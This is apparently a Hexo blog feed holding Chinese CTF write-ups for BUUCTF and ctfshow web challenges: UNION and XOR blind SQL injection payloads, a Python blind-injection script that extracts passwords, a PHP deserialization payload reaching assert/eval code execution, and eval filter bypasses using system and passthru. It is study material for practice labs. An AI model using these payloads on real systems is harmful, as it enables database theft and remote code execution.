class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221022144419800-1667047819736154.png" alt="image-20221022144419800" style="zoom:67%;" /><p><strong>但是无法知道<code>users</code>的列名,需要进行无列名查询</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select/**/group_concat(x.3)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)x;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/group_concat(x.3)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)x),&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;10&#x27;,&#x27;11&#x27;,&#x27;12&#x27;,&#x27;13&#x27;,&#x27;14&#x27;,&#x27;15&#x27;,&#x27;16&#x27;,&#x27;17&#x27;,&#x27;18&#x27;,&#x27;19&#x27;,&#x27;20&#x27;,&#x27;21&#x27;,&#x27;22</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221022144915861.png" alt="image-20221022144915861" style="zoom:80%;" /><br><hr><br><h1 id="反序列化-assert-eval-引入其他GET参数绕过过滤-ReadlezPHP"><a href="#反序列化-assert-eval-引入其他GET参数绕过过滤-ReadlezPHP" class="headerlink" title="[反序列化,assert(eval(..)),引入其他GET参数绕过过滤]ReadlezPHP"></a>[反序列化,assert(eval(..)),引入其他GET参数绕过过滤]ReadlezPHP</h1><p>进去之后网页默认没法右键菜单,所以抓包看一下源码</p><p>发现了一个<code>time.php</code>而且似乎还可以通过<code>GET</code>的<code>source</code>传参</p><img src="/images/buuctf-web/image-20221022154621834.png" alt="image-20221022154621834" style="zoom:80%;" /><p>随便传一个,直接出了源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?source=2</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反序列化题目:</p><p>利用点是第14行的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $b($a);</span><br><span class="line">那么可以构造$b=system, $a=cat /flag</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a = &#x27;参数&#x27;;</span><br><span class="line">    public $b = &#x27;要执行的函数&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new HelloPhp();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>但是这里试了<code>system</code>,<code>exec</code>等都无法输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;cat /flag&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><p>尝试一个无害函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;s:2:&quot;pi&quot;;&#125;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221022160705759.png" alt="image-20221022160705759" style="zoom:80%;" /><p><strong>考虑一下引入其他GET参数来执行命令.多次尝试,必须是<code>assert(eval(..)) </code> 这种形式才能成功执行</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;eval($_GET[1])&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在后面的命令中,<code>system</code>等函数仍然不能用,尝试半天<code>scandir</code>还能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:14:&quot;eval($_GET[1])&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;&amp;1=var_dump(scandir(&quot;/&quot;));</span><br><span class="line">输出:</span><br><span class="line">array(23) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(10) &quot;FIag_!S_it&quot; [4]=&gt; string(3) &quot;bin&quot; [5]=&gt; string(4) &quot;boot&quot; [6]=&gt; string(3) &quot;dev&quot; [7]=&gt; string(3) &quot;etc&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(3) &quot;opt&quot; [14]=&gt; string(4) &quot;proc&quot; [15]=&gt; string(4) &quot;root&quot; [16]=&gt; string(3) &quot;run&quot; [17]=&gt; string(4) &quot;sbin&quot; [18]=&gt; string(3) &quot;srv&quot; [19]=&gt; string(3) &quot;sys&quot; [20]=&gt; string(3) &quot;tmp&quot; [21]=&gt; string(3) &quot;usr&quot; [22]=&gt; string(3) &quot;var&quot; &#125; 2022-10-22 08:34:24</span><br><span class="line"></span><br><span class="line">http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:14:&quot;eval($_GET[1])&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;&amp;1=echo file_get_contents(&quot;/FIag_!S_it&quot;);</span><br><span class="line">输出:</span><br><span class="line">NPUCTF&#123;this_is_not_a_fake_flag_but_true_flag&#125; 2022-10-22 08:36:09</span><br></pre></td></tr></table></figure><p>假的flag….</p><p>没想到flag在<code>phpinfo</code>中找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cf68aafc-7607-4725-971f-3609fa5db3bf.node4.buuoj.cn:81/time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:14:&quot;eval($_GET[1])&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;&amp;1=phpinfo();</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221022163859246-1667047819736155.png" alt="image-20221022163859246" style="zoom:67%;" /><br><hr><br><h1 id="基于异或运算的盲注-FinalSQL"><a href="#基于异或运算的盲注-FinalSQL" class="headerlink" title="[基于异或运算的盲注]FinalSQL"></a>[基于异或运算的盲注]FinalSQL</h1><img src="/images/buuctf-web/image-20221022173149594-1667047819736156.png" alt="image-20221022173149594" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27; or &#x27;1&#x27;=&#x27;1&#x27;#</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221022173232632.png" alt="image-20221022173232632" style="zoom:80%;" /><p>存在过滤,这里应该是<code>or</code>,那么使用异或盲注来代替试试</p><p><strong><code>A^B</code>,AB如果相同则返回0,不同则返回1</strong></p><p>那么首先爆一下数据库名的长度试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search.php?id=1^(length(database())=3)#</span><br><span class="line">返回:NO! Not this! Click others~~~ (id=1时查到的内容) 说明(length(database())=3)的值不是1,所以是false</span><br><span class="line"></span><br><span class="line">search.php?id=1^(length(database())=4)# </span><br><span class="line">返回:error 这里报错了,推测查询了id=0,即(length(database())=4)返回了1,因此数据库名的长度为4</span><br></pre></td></tr></table></figure><p>后面爆具体名的话就不能一个一个试了,需要靠脚本了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search.php?id=1^(substr(database(),1,1)=&#x27;g&#x27;)#   error</span><br><span class="line">search.php?id=1^(substr(database(),1,1)=&#x27;f&#x27;)#   NO! Not this! Click others</span><br><span class="line">说明库名的第一个位置是g</span><br></pre></td></tr></table></figure><p>爆表名的过程中发现又触碰到了过滤词, 一开始以为只有<code>or</code>,遂把<code>information_schema</code>换成<code>mysql.innodb_table_stats</code></p><p>不对,好像没有过滤or😅</p><p>最后发现被过滤的是空格,尝试使用<code>/**/</code>代替无果, 改为使用括号来绕过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表名:F1naI1y,Flaaaaag</span><br><span class="line">F1naI1y的列名:id,username,password</span><br></pre></td></tr></table></figure><p>盲注脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">chars = string.printable[:]  <span class="comment">#返回所有可打印的字母，数字，符号的集合</span></span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://a01809ec-5fe8-45cc-96cc-3078c22fecbb.node4.buuoj.cn:81/search.php?id=1^&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>(<span class="params">length</span>): <span class="comment">#爆库名</span></span><br><span class="line">    database_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;length+<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;(substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, c)</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                database_name += c</span><br><span class="line">                <span class="built_in">print</span>(database_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>(): <span class="comment">#爆表名</span></span><br><span class="line">    tables_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=&#x27;geek&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">str</span>(c))</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                tables_name += c</span><br><span class="line">                <span class="built_in">print</span>(tables_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>(): <span class="comment">#爆F1naI1y表的列名</span></span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">str</span>(c))</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="built_in">print</span>(column_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(): <span class="comment">#爆F1naI1y表password字段的数据</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            payload = <span class="string">&quot;(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">str</span>(c))</span><br><span class="line">            url = base_url + payload</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            res = session.get(url).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ERROR！！！&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                data += c</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database_name(4)</span></span><br><span class="line"><span class="comment"># get_table_name()</span></span><br><span class="line"><span class="comment"># get_column_name()</span></span><br><span class="line">get_data() <span class="comment">#最后这个要跑好久...</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux+Windows的安全事件响应清单</title>
      <link href="/post/d0bdcf10.html"/>
      <url>/post/d0bdcf10.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c17fa6041f4817eba0c090335fd2dd7392b68afb33d189dd604d68d47c6c5e03"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow刷题_web入门命令执行篇</title>
      <link href="/post/e40cde58.html"/>
      <url>/post/e40cde58.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用GET传参数<code>c</code>, 如果使用<code>preg_match</code>在<code>c</code>中没有匹配到<code>flag</code>字符串, 那么<code>c</code>就能被执行</p><p>先传一个<code>phpinfo()</code>, 可以正常执行</p><img src="/images/ctf-web06/image-20220924155413736.png" alt="image-20220924155413736" style="zoom:67%;" /><p><strong><code>php</code>中, 可以使用<code>system(&quot;要执行的系统命令&quot;)</code>来执行系统命令</strong></p><p>例如这里传一个:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>成功读取了当前目录下的内容, 发现有个<code>flag.php</code></p><img src="/images/ctf-web06/image-20220924155523457.png" alt="image-20220924155523457" style="zoom:67%;" /><p>但flag会被过滤掉，遂尝试使用通配符*来绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat f*.php&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/images/ctf-web06/image-20220924155651400.png" alt="image-20220924155651400" style="zoom:67%;" /><p>然而什么都没显示.. 那么尝试将结果输出到文件中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat f*.php&gt;&gt;3.txt&quot;)</span><br></pre></td></tr></table></figure><p>执行后再访问<code>3.txt</code>, 就能够看到flag了</p><img src="/images/ctf-web06/image-20220924155815662.png" alt="image-20220924155815662" style="zoom:67%;" /><br><hr><br><h1 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次把<code>system命令也过滤了</code></p><p><strong>在GET中用 <code>eval</code>执行POST中的变量, 然后在POST中执行命令</strong></p><img src="/images/ctf-web06/image-20220924161454556.png" alt="image-20220924161454556" style="zoom:67%;" /><p>查看1.txt就找到flag了</p><p><img src="/images/ctf-web06/image-20220924161522232.png" alt="image-20220924161522232"></p><br><hr><br><h1 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和30类似, 只不过多过滤了不少关键词, 30的方法已经可以使用</p><p>这里尝试一下使用<code>passthru</code>命令来执行系统命令</p><img src="/images/ctf-web06/image-20220924162452963.png" alt="image-20220924162452963" style="zoom:67%;" /><br><hr><br><h1 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title 